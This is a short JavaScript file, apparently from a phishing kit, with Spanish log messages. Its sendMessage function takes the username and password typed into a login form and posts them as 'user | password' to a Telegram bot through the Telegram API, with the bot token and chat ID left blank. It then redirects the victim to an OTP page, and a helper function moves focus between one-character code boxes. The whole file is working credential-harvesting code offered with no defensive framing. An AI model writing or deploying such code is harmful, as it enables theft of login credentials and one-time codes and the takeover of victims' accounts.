function sendMessage() {
  const username = document.getElementById('user').value;
  const password = document.getElementById('password').value;

  if (username.trim() === '' || password.trim() === '') {
      console.error('Los campos de usuario y contraseña no pueden estar vacíos.');
      return;
  }

  const telegramBotToken = '';
  const chatId = '';

  const telegramBotUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const message = `${username} | ${password}`;

  const data = {
      chat_id: chatId,
      text: message
  };

  axios.post(telegramBotUrl, data)
  .then(response => {
      console.log('Hecho.');
      setTimeout(function() {
          window.location.href = './otp.html';
      }, 5000);
  })
  .catch(error => {
      console.error('Error.', error);
  });
}



function moveToNext(input) {
    if (input.value.length === 1) {
      var nextInput = input.nextElementSibling;
      if (nextInput !== null) {
        nextInput.focus();
      }
    } else if (input.value.length === 0) {
      var prevInput = input.previousElementSibling;
      if (prevInput !== null) {
        prevInput.focus();
      }
    }
  }